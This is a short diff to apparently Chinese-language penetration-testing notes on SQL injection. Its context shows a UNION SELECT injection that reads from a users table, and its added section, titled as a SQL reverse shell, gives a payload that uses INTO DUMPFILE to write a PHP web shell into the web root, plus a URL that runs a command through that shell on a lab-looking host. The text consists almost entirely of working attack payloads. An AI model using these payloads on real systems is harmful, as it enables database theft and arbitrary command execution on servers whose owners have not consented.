@@ -48,3 +48,11 @@
 
 " union select 1,2,position  from users -- -
 ```
+
+- SQL 反弹 shell
+
+```
+SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php'
+
+http://10.10.10.33/shell.php?cmd=pwd
+```
